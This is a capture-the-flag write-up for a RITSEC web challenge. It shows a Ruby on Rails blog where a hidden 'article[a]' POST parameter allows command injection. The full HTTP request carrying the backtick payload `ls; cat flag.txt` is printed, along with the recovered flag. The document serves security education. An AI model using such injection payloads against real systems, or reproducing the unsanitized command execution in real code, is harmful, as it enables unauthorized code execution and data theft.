# Challenge
```
fun.ritsec.club:3000

Author: hulto

```
# Solve

After looking on the website for a while, I find something very interesting. When posting articles, the article doesn't get posted and we get redirected to a blank page. After analyzing the POST request for the article creation page, I notice the following POST parameters:

* article[title] - The title of the article
* article[text] - The content of the article
* article[a] - ???

The `article[a]` was very weird. I tried modifying it, but it only accepted numbers, otherwise an error would be thrown. Scouting the source of the website's files, we can figure out it's a ruby on rails application. After fiddling with it, we can obtain Remote Code Execution by injecting commands in the `a` parameter.

Our request would look like this:

```
POST /articles HTTP/1.1
Host: fun.ritsec.club:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en-GB;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://fun.ritsec.club:3000/articles/new
Content-Type: application/x-www-form-urlencoded
Content-Length: 214
Connection: close
Cookie: _blog_session=eD0v3Cb7dd62Tyl79dwyPfwQk8I5Jyc5ICM5ow9aq1N5De0cth8oFWoJOyOw%2Bcgmt4Po1DBcyEx7cKdzft09CIJyjjBG%2B5ooNycNTi2TOLiJLc7fIWcOh%2FoHkD8qd285%2BHZfEcyPW3sMom3stG4%3D--kXSYp4rypd%2F8fdvw--UJ3q9hz0%2BhIUcG999GdPsA%3D%3D
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

utf8=%E2%9C%93&authenticity_token=hqUwY3crUTSTCrg8ZuTqqaHphRrJOt2kqr6zPq3R5A%2B3rRaV9BLbwhdx%2B3%2FMCULd4fpAGb4rVjrtq8ToKUncDQ%3D%3D&article%5Btitle%5D=oof&article%5Btext%5D=test&article%5Ba%5D=`ls; cat flag.txt`&commit=Save+Article
```

![](https://i.imgur.com/miv9gpE.png)

![](https://i.imgur.com/5aJtgtm.png)

Bingo! The flag was `RITSEC{W0wzers_who_new_3x3cuting_c0de_to_debug_was_@_bad_idea}`.
